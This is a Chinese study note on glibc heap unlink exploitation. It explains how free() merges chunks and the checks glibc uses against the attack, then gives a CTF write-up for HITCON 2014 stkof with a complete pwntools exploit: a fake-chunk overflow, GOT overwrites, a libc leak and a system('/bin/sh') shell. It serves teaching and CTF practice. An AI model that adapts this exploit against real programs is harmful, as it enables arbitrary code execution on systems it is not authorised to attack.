# Linux unlink技术学习

该文章来自 [Linux堆溢出漏洞利用之unlink](https://wooyun.js.org/drops/Linux%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bunlink.html)

存在漏洞的代码

```c
#!c
/* 
 Heap overflow vulnerable program. 
 */
#include <stdlib.h>
#include <string.h> 

int main( int argc, char * argv[] )
{
        char * first, * second; 

/*[1]*/ first = malloc( 666 );
/*[2]*/ second = malloc( 12 );
        if(argc!=1)
/*[3]*/         strcpy( first, argv[1] );
/*[4]*/ free( first );
/*[5]*/ free( second );
/*[6]*/ return( 0 );
}
```

在代码[3]处存在一个堆溢出漏洞，如果用户输入的argv[1]的大小比first变量的666字节更大的话，那么输入的数据就有可能覆盖掉下一个chunk的chunk header——这可以导致任意代码执行。而攻击的核心思路就是利用glibc malloc的unlink机制。

![img](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/2016060603571010923120.png)

## unlink技术原理

### 基本知识

```
	unlink攻击技术就是利用”glibc malloc”的内存回收机制，将上图中的second chunk给unlink掉，并且，在unlink的过程中使用shellcode地址覆盖掉free函数(或其他函数也行)的GOT表项。这样当程序后续调用free函数的时候(如上面代码[5])，就转而执行我们的shellcode了。显然，核心就是理解glibc malloc的free机制。
	一旦涉及到free内存，那么就意味着有新的chunk由allocated状态变成了free状态，此时glibc malloc就需要进行合并操作——向前以及(或)向后合并。这里所谓向前向后的概念如下：将previous free chunk合并到当前free chunk，叫做向后合并；将后面的free chunk合并到当前free chunk，叫做向前合并。
```

#### 一、向后合并：

```c
#!c
    /*malloc.c  int_free函数中*/
/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/
/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
size += prevsize;
//修改指向当前chunk的指针，指向前一个chunk。
      p = chunk_at_offset(p, -((long) prevsize)); 
      unlink(p, bck, fwd);
}   

//相关函数说明：
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) 

/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
#define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                   \
    BK = P->bk;                                   \
    FD->bk = BK;                                  \
    BK->fd = FD;                                  \
    ...
}
```

首先检测前一个chunk是否为free，这可以通过检测当前free chunk的PREV_INUSE(P)比特位知晓。在本例中，当前chunk（first chunk）的前一个chunk是allocated的，因为在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。

```
如果为free的话，那么就进行向后合并：
1)将前一个chunk占用的内存合并到当前chunk;
2)修改指向当前chunk的指针，改为指向前一个chunk。
3)使用unlink宏，将前一个free chunk从双向循环链表中移除
```

在本例中由于前一个chunk是allocated的，所以并不会进行向后合并操作。

#### 二、向前合并操作：

​		首先检测next chunk是否为free。那么如何检测呢？很简单，查询next chunk之后的chunk的 PREV_INUSE (P)即可。相关代码如下：

```c
#!c
……
/*这里p指向当前chunk*/
nextchunk = chunk_at_offset(p, size);
……
nextsize = chunksize(nextchunk);
……
if (nextchunk != av->top) { 
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk
      /* consolidate forward */
      if (!nextinuse) { //next chunk为free chunk
            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除
          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
      } else
            clear_inuse_bit_at_offset(nextchunk, 0);    
      ……
    }
```

​		整个操作与”向后合并“操作类似，再通过上述代码结合注释应该很容易理解free chunk的向前结合操作。在本例中当前chunk为first，它的下一个chunk为second，再下一个chunk为top chunk，此时 top chunk的 PREV_INUSE位是设置为1的(表示top chunk的前一个chunk，即second chunk, 已经使用)，因此first的下一个chunk不会被“向前合并“掉。

介绍完向前、向后合并操作，下面就需要了解合并后(或因为不满足合并条件而没合并)的chunk该如何进一步处理了。在glibc malloc中，会将合并后的chunk放到unsorted bin中

```c
#!c
/*
 Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.
*/  

bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk
/*
  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
    #define unsorted_chunks(M)          (bin_at (M, 1))
*/
      fwd = bck->fd;
      ……
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;  

      set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用
set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size
/*
   /* Set size/use field */
   #define set_head(p, s)       ((p)->size = (s))
   /* Set size at footer (only when chunk is not in use) */
   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))
*/
```

上述代码完成的整个过程简要概括如下：将当前chunk插入到unsorted bin的第一个chunk(第一个chunk是链表的头结点，为空)与第二个chunk之间(真正意义上的第一个可用chunk)；然后通过设置自己的size字段将前一个chunk标记为已使用；再更改后一个chunk的prev_size字段，将其设置为当前chunk的size。

```
注意：上一段中描述的”前一个“与”后一个“chunk，是指的由chunk的prev_size与size字段隐式连接的chunk，即它们在内存中是连续、相邻的！而不是通过chunk中的fd与bk字段组成的bin(双向链表)中的前一个与后一个chunk，切记！。
```

在本例中，只是将first chunk添加到unsorted bin中。

### 攻击分析

现在我们再来分析如果一个攻击者在代码[3]中精心构造输入数据并通过strcpy覆盖了second chunk的chunk header后会发生什么情况。

假设被覆盖后的chunk header相关数据如下：

1 prev_size = 一个偶数，这样其PREV_INUSE 位就是0 了，即表示前一个chunk为free。
2 size = -4
3 fd = free 函数的got表地址address – 12；(后文统一简称为“free addr – 12”)
4 bk = shellcode的地址

那么当程序在[4]处调用free(first)后会发生什么呢？我们一步一步分析。

一、向后合并

鉴于first的前一个chunk非free的，所以不会发生向后合并操作。

二、向前合并

先判断后一个chunk是否为free，前文已经介绍过，glibc malloc通过如下代码判断：

```c
#!c
nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
这里inuse_bit_at_offset宏定义如下：
/* check/set/clear inuse bits in known places */
#define inuse_bit_at_offset(p, s)                         \
  (((mchunkptr) (((char *) (p)) + (s)))->size & PREV_INUSE)
```

PS：在本例中next chunk即second chunk，为了便于理解后文统一用next chunk。

从上面代码可以知道，它是通过将nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位。在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd);函数。真正的重点就是这个unlink函数！

在已经介绍过unlink函数的实现，这里为了便于说明攻击思路和过程，再详细分析一遍，unlink代码如下：

```c
#!c
#define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                   \
    BK = P->bk;                                   \
    FD->bk = BK;                                  \
    BK->fd = FD;                                  \
    ...
}
```

此时P = nextchunk, BK = bck, FD = fwd。

1)首先FD = nextchunk->fd = free地址 – 12;
2)然后BK = nextchunk->bk = shellcode起始地址；
3)再将BK赋值给FD->bk，即（free地址 – 12）->bk = shellcode起始地址；
4)最后将FD赋值给BK->fd，即(shellcode起始地址)->fd = free地址 – 12。

前面两步还好理解，主要是后面2步比较迷惑。我们作图理解：

![img](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/2016060603583849316214.png)

结合上图就很好理解第3，4步了。细心的朋友已经注意到，free addr -12和shellcode addr对应的prev_size等字段是用虚线标记的，为什么呢？因为事实上它们对应的内存并不是chunk header，只是在我们的攻击中需要让glibc malloc在进行unlink操作的时候将它们强制看作malloc_chunk结构体。这样就很好理解为什么要用free addr – 12替换next chunk的fd了，因为(free addr -12)->bk刚好就是free addr，也就是说第3步操作的结果就是将free addr处的数据替换为shellcode 的起始地址。

由于已经将free addr处的数据替换为了shellcode的起始地址，所以当程序在代码[5]处再次执行free的时候，就会转而执行shellcode了。

至此，整个unlink攻击的原理已经介绍完毕，剩下的工作就是根据上述原理，编写shellcode了。只不过这里需要注意一点，glibc malloc在unlink的过程中会将shellcode + 8位置的4字节数据替换为free addr – 12，所以我们编写的shellcode应该跳过前面的12字节。

### 对抗技术

#### Double Free检测

该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：

```
#!c
/* Or whether the block is actually not marked used. */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))
      {
            errstr = "double free or corruption (!prev)";
            goto errout;
      }
```

#### next size非法检测

该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：

```
#!c
nextsize = chunksize(nextchunk);
if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
             || __builtin_expect (nextsize >= av->system_mem, 0)){
        errstr = "free(): invalid next size (normal)";
        goto errout;
}
```

#### 双链表冲突检测

该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：

```
#!c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             \
      malloc_printerr (check_action, "corrupted double-linked list", P);      \
```

## unlink攻击技术题目训练 2014-HITCON-stkof

使用checksec进行分析

![image-20220921140616439](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921140616439.png)

接着我们用ida进行反汇编

主函数

![image-20220921141814841](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921141814841.png)

这里根据我们输入的选项会执行不同的函数，从选择1开始到选项4分别执行的函数为

1、alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 head

![image-20220921143414217](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143414217.png)

我们申请的第一个缓冲区的chunk指针存在globals[1]中

![image-20220921144843657](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921144843657.png)

2、fill：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况

![image-20220921141516086](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921141516086.png)

```
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
参数
    ptr -- 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针。
    size -- 这是要读取的每个元素的大小，以字节为单位。
    nmemb -- 这是元素的个数，每个元素的大小为 size 字节。
    stream -- 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流。
返回值
    成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾。
fread(ptr, 1uLL, size, stdin)
向ptr指针所指的地址读取size个字节的值，每次读1字节，读取成功后返回1
```

3、free_chunk：根据指定索引，释放已经分配的内存块

![image-20220921143804418](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143804418.png)

4、print：输入一些信息

![image-20220921143811935](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921143811935.png)

-------------------------

我们的做题思路是通过unlink函数，修改free@plt为put@plt，想办法输出puts函数的真实地址，计算libcbase，从而得到system地址，修改atoi@got为system，通过的输入/bin/sh的地址，执行system('/bin/sh')获得shell

我们先弄一个正常交互的脚本

```python
# coding=utf-8
from pwn import *

link = 0
if link == 1:
    shell = remote("", )
else:
    shell = process("./stkof")
elf = ELF("./stkof")
libc = ELF("./libc.so.6")

def alloc(size):
    shell.sendline("1")
    shell.sendline(str(size))
    shell.recvuntil("OK\n")

def fill(idx, cont):
    shell.sendline("2")
    shell.sendline(str(idx))
    shell.sendline(str(len(cont)))
    shell.send(cont)
    shell.recvuntil("OK\n")

def free(idx):
    shell.sendline("3")
    shell.sendline(str(idx))
    shell.recvuntil("OK\n")
```

fill函数的没有对输入进行限制，但是读入的方法不是gets那种，他读到换行符不会结束，会把换行符也当作一种输入，然后继续等待接下来的输入，而sendline在末尾会有换行符，所以我们采用末尾不带有换行符而是相当于带有\x00的send。

首先我们申请内存

```python
alloc(0x100) #1
alloc(0x30)  #2
alloc(0x80)  #3
```

我们用gdb在0x400CB6处下个断点`b *0x400CB6`，开始执行选项1进行空间分配，分配完之后看到我们的指针的数组globals(0x602140)处，发现确实是从globals[1]开始记录我们分配的head

![image-20220921181932845](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220921181932845.png)

这里我们的思路为分配3个空间，**在第二个空间溢出**，让**02 chunk and 03 chunk 合并**, unlink.

那我们就需要伪造chunk

```
unlink的验证则要求fd->bk == P && bk->fd == P
```

首先我们使用head变量记录globals的起始位置

```python
head = 0x602140 # 

#fake chunk
chunk_fd = head + 0x10 -0x18 #pass check
chunk_bk = head + 0x10 -0x10 #pass check

payload = p64(0)            #padding
payload += p64(0x31)        #size (chunk1 not affect,30 or 31 bath pass)
payload += p64(chunk_fd)    # chunk2 - 0x18
payload += p64(chunk_bk)    # chunk2 - 0x10
payload += p64(0)           #padding
payload += p64(0)           #padding

payload += p64(0x30)        #overwrite chunk3's prev_size
payload += p64(0x90)        #overwrite chunk3's size

fill(2, payload) #overwrite chunk3
# a = input() //sh: gdb -p 端口
free(3) #unlink
```

我们unlink之前globals指针数组中的情况

![image-20220922142102103](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142102103.png)

再看看chunk2的位置，成功覆盖调了chunk3的**prev_size**和**size**里的**prev_inuse**标志位

![image-20220922142416774](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142416774.png)

触发unlink之后，chunk3被free掉并置NULL，而chunk2的指针变成了head-0x8

![image-20220922142612983](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922142612983.png)

现在我们利用类似的方法free_got替换成puts_plt，首先需要把free_got和puts_got的地址放进去

```python
payload = p64(0)
payload += p64(elf.got['free'])
payload += p64(elf.got['puts'])
payload += p64(elf.got['atoi'])
fill(2,payload)
#gdb.attach(shell)
```

![image-20220922144712621](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922144712621.png)

```python
此时
globals[0] = elf.got['free']
globals[1] = elf.got['puts']
globals[2] = elf.got['atoi']
```

接下来我们把free_got替换成puts_plt

```python
payload = p64(elf.plt['puts'])
fill(0,payload)
```

之后我们再执行free(1)时，相当于puts(puts_got)，可以拿到puts的真实地址，又知道libc，可以通过偏移知道system

```python
free(1)     #put(puts@pot)
puts_addr = shell.recvuntil("\nOK\n",drop=True).ljust(8,'\x00')
puts_addr = u64(puts_addr)
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
```

接着我们将atoi_got替换成system就能获得shell

```
payload = p64(system_addr)
fill(2,payload)

shell.sendline('/bin/sh')
shell.interactive()
```

![image-20220922151247378](LinuxUnlink%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0.assets/image-20220922151247378.png)

完整exp

```python
# coding=utf-8
from pwn import *

link = 0
if link == 1:
    shell = remote("", )
else:
    shell = process("./stkof")
elf = ELF("./stkof")
libc = ELF("./libc.so.6")

def alloc(size):
    shell.sendline("1")
    shell.sendline(str(size))
    shell.recvuntil("OK\n")

def fill(idx, cont):
    shell.sendline("2")
    shell.sendline(str(idx))
    shell.sendline(str(len(cont)))
    shell.send(cont)
    shell.recvuntil("OK\n")

def free(idx):
    shell.sendline("3")
    shell.sendline(str(idx))

alloc(0x100) #1
alloc(0x30)  #2
alloc(0x80)  #3

head = 0x602140

#fake chunk
chunk_fd = head + 0x10 -0x18 #pass check
chunk_bk = head + 0x10 -0x10 #pass check

payload = p64(0)            #padding
payload += p64(0x31)        #size (chunk1 not affect,30 or 31 bath pass)
payload += p64(chunk_fd)    # chunk2 - 0x18
payload += p64(chunk_bk)    # chunk2 - 0x10
payload += p64(0)           #padding
payload += p64(0)           #padding

payload += p64(0x30)        #overwrite chunk3's prev_size
payload += p64(0x90)        #overwrite chunk3's size

fill(2, payload)            #overwrite chunk3
free(3)     #unlink globals[2] = &globals - 0x8
shell.recvuntil("OK")

payload = p64(0)
payload += p64(elf.got['free']) #globals[0]
payload += p64(elf.got['puts']) #globals[1]
payload += p64(elf.got['atoi']) #globals[2]
fill(2,payload)
payload = p64(elf.plt['puts'])
fill(0,payload)     #free@got = puts@plt

free(1)     #put(puts@pot)
puts_addr = shell.recvuntil("\nOK\n",drop=True).ljust(8,'\x00')
puts_addr = u64(puts_addr)
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']

print 'puts_addr = ' + hex(puts_addr)
print 'libcbase = ' + hex(libcbase)
print 'system = ' + hex(system_addr)

payload = p64(system_addr)
fill(2,payload)

shell.sendline('/bin/sh')
shell.interactive()
```

